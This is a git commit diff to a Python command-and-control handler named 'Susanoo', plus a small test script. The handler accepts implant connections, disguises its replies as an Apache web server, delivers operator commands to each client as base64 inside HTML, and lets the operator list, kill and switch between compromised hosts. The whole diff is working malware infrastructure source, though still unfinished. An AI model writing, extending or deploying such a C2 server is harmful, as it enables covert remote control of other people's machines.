a16f9df8048fb2e09c3cfdedee5e173753852cc9
root <root@localhost.localdomain>
2019-10-23 06:58:55 +0530

    Need to add colors, arrow functionality and ctrl-c avoidation

--- Python/Handler/C2handler.py
+++ Python/Handler/C2handler.py
@@ -3,7 +3,7 @@
 import socket
 import sys
 import os
-import multiprocessing as mp
+import multiprocessing
 import threading
 import queue
 import time
@@ -13,45 +13,95 @@ import base64
 
 q = queue.Queue()
 process_list = []
-ip_list = []
 host_list = []
+port_list = []
+parent_pipe_list = []
 
 
 
-def clientExecuter(client,client_addr,q):
-    cmd_queue = queue.Queue()
+
+def addToQueue(cmd_queue,child_pipe):
     while(True):
-        
-        data = client.recv(4096)
-        data = data.decode('utf-8')
-        # data = data.encode('utf-8')
-        print("[DEBUG] data Recieved\n{}".format(data))
-        send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\n\r\n'
-        cmd = cmd_queue.get()
+        cmd = child_pipe.recv()
+        cmd_queue.put(cmd)
 
-        if(re.findall('POST',data[:20])):
-            send_data = send_data + 'POST request is recieved\r\n'
-            # it means this is a result of some past request
-        elif(re.findall('GET',data[:20])):
-            base = base64.b64encode(cmd).decode('utf-8')
-            send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
-        else:
-            send_data = send_data + 'NO Request method found\r\n'
-        send_data = send_data.encode('utf-8')
-        client.sendall(send_data)
+
+
+def clientExecuter(client,client_addr,child_pipe):
+
+    cmd_queue = queue.Queue()
+    pipe_thread = threading.Thread(target=addToQueue,args=(cmd_queue,child_pipe))
+    pipe_thread.start()
+    while(True):
+        try:    
+            data = client.recv(4096)
+            data = data.decode('utf-8')
+            # data = data.encode('utf-8')
+            # print("[DEBUG] data Recieved\n{}".format(data))
+            send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\n\r\n'
+            if (cmd_queue.empty()):
+                cmd = "helloworld"
+            else:
+                cmd = cmd_queue.get()
+            cmd_byte = cmd.encode('utf-8')
+            if(re.findall('POST',data[:20])):
+                send_data = send_data + 'POST request is recieved\r\n'
+                # it means this is a result of some past request
+            elif(re.findall('GET',data[:20])):
+                base = base64.b64encode(cmd_byte).decode('utf-8')
+                send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
+            else:
+                send_data = send_data + 'NO Request method found\r\n'
+            send_data = send_data.encode('utf-8')
+            client.sendall(send_data)
+        except Exception as ex:
+            proc_name = multiprocessing.current_process().name
+            print("\nConnection broken from {}:{} in {}".format(client_addr[0],str(client_addr[1]),proc_name))
+            break
+    pipe_thread.join()
     client.close()
     # Write code to get data from pipe and add commands to queue to execute and pipe back the data from the queue which stores result
-    
 
+
+
+def clientCmdShell(i):
+
+    global process_list
+    global parent_pipe_list
+    while(True):
+        client_cmd = str(input("{}> ".format(process_list[i].name)))
+        if(client_cmd == ""):
+            pass
+        elif(client_cmd == "yolo"):
+            break
+            # Close all the process one by one and exit the program after that
+        else:
+            parent_pipe_list[i].send(client_cmd)
+            
 
 def switch(process_name):
-    print("\n")
+
+    global process_list
+    flag = 0
+    i = 0
+    for i in range(len(process_list)):
+        if(process_list[i].name == process_name):
+            flag = 1
+            break
+    if(flag == 0):
+        print("No process found by the name: {}".format(process_name))
+    else:
+        clientCmdShell(i)
     # write code to switch cmd shell between different processes
 
+
+
 def handlerExecuter(cmd):
+
     global process_list
-    global ip_list
+    global parent_pipe_list
     global host_list
+    global port_list
     # print("[DEBUG] cmd:{}\n".format(cmd))
     if(cmd[:4]=='kill'):    # kill specified connection
         proc_name = cmd[5:]
@@ -60,7 +110,8 @@ def handlerExecuter(cmd):
             if(process_list[i].name == proc_name):
                 process_list[i].terminate()
                 del process_list[i]
-                del ip_list[i]
+                del parent_pipe_list[i]
+                del port_list[i]
                 del host_list[i]
                 print("[+] Process " + proc_name + " is terminated\n")
                 flag = 1
@@ -74,19 +125,21 @@ def handlerExecuter(cmd):
             proc_name = process_list[i].name
             process_list[i].terminate()
             del process_list[i]
-            del ip_list[i]
+            del parent_pipe_list[i]
             del host_list[i]
+            del port_list[i]
             print("[+] Process " + proc_name + " is terminated\n")
         if(flag == 0):
             print("[-] Process not found\n")
     elif(cmd[:4] == "list"):    # list all the connected hosts
         # print("[DEBUG] inside list")
         for i in range(len(process_list)):
-            proc_name = process_list[i]
-            ip_address = ip_list[i]
+            proc_name = process_list[i].name
             hostname = host_list[i]
-            print("{} {} {}".format(proc_name,ip_address,hostname))
+            port = port_list[i]
+            print("{} => {}:{}".format(proc_name,hostname,port))
     elif(cmd[:6] == "switch"):
+        process_name = cmd[7:]
         switch(process_name)
         # print("[DEBUG] switch")
     else:
@@ -95,6 +148,7 @@ def handlerExecuter(cmd):
 
 
 def handlerCmdShell(q):
+
     global process_list
     while(True):
         handler_cmd = str(input("Susanoo> "))
@@ -104,7 +158,7 @@ def handlerCmdShell(q):
             print("\n[+] Killing all running processes\n")
             for proc in process_list:
                 time.sleep(0.1)
-                proc.join()
+                proc.terminate()
             time.sleep(2)
             os._exit(0)
             # Close all the process one by one and exit the program after that
@@ -113,8 +167,28 @@ def handlerCmdShell(q):
 
 
 
-def listener(lhost,lport,q):
+def createConnectionProcess(client,client_addr):
+    
     global process_list
+    global parent_pipe_list
+    global host_list
+    global port_list
+    parent_pipe, child_pipe = multiprocessing.Pipe()        # Creating Pipe for connection to new processes
+    parent_pipe_list.append(parent_pipe)                    # Appended to list to keep track of parent pipes
+    host_list.append(client_addr[0])
+    port_list.append(client_addr[1])
+    new_process = multiprocessing.Process(target=clientExecuter,args=(client,client_addr,child_pipe))
+    process_list.append(new_process)
+    new_process.start()
+    print("\n[+] {}:{} connected as {}".format(client_addr[0],str(client_addr[1]),new_process.name))
+    new_process.join()
+    new_process.terminate()
+    # Created new process for every connection that I get and save the process in process_list
+
+
+
+def listener(lhost,lport,q):
+    
     sock = socket.socket()
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.bind((lhost,lport))
@@ -129,11 +203,9 @@ def listener(lhost,lport,q):
 
     while(len(process_list)<100):
         (client,client_addr) = sock.accept()
-        new_process = mp.Process(target=clientExecuter,args=(client,client_addr,q))
-        process_list.append(new_process)
-        new_process.start()
-        print("[+] {} connected as {}".format(client_addr[0],new_process.name))
-        # Created new process for every connection that I get and save the process in process_list 
+        create_process_thread = threading.Thread(target=createConnectionProcess,args=(client,client_addr))
+        create_process_thread.start()
+    
     sock.close()
 
 
--- Python/Handler/testing.py
+++ Python/Handler/testing.py
@@ -5,34 +5,46 @@ import os
 import sys
 import time
 import logging
+import socket
 
-def targetfunc(i):
-    while(True):
-        name = multiprocessing.current_process().name
-        print("[!] "+str(name)+" is running")
-        time.sleep(2)
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind(('',8080))
+s.listen(2)
+(client,client_addr) = s.accept()
+time.sleep(5000)
+data = client.recv(4096)
+print(data)
+client.close()
 
-if __name__ == '__main__':
-    multiprocessing.log_to_stderr()
-    logger = multiprocessing.get_logger()
-    logger.setLevel(logging.INFO)
-    proc_name = ""
-    print("[+] Creating some processes\n")
-    process_list = []
-    for i in range(4):
-        proc = multiprocessing.Process(target=targetfunc, args=(proc_name,))
-        process_list.append(proc)
-        proc_name = proc.name
-        proc.start()
-    print("\nprocess creation is done\n")
-    process_list[2].terminate()
-    del process_list[2]
-    print("\nprocess 3 is killed\n")
-    time.sleep(5)
-    print("killing all processes\n")
-    print(process_list[2].name)
-    for i in range(len(process_list)):
-        proc_name = process_list[i].name
-        print(proc_name)
-        process_list[i].terminate()
+
+# def targetfunc(i):
+#     while(True):
+#         name = multiprocessing.current_process().name
+#         print("[!] "+str(name)+" is running")
+#         time.sleep(2)
+
+# if __name__ == '__main__':
+#     multiprocessing.log_to_stderr()
+#     logger = multiprocessing.get_logger()
+#     logger.setLevel(logging.INFO)
+#     proc_name = ""
+#     print("[+] Creating some processes\n")
+#     process_list = []
+#     for i in range(4):
+#         proc = multiprocessing.Process(target=targetfunc, args=(proc_name,))
+#         process_list.append(proc)
+#         proc_name = proc.name
+#         proc.start()
+#     print("\nprocess creation is done\n")
+#     process_list[2].terminate()
+#     del process_list[2]
+#     print("\nprocess 3 is killed\n")
+#     time.sleep(5)
+#     print("killing all processes\n")
+#     print(process_list[2].name)
+#     for i in range(len(process_list)):
+#         proc_name = process_list[i].name
+#         print(proc_name)
+#         process_list[i].terminate()
     
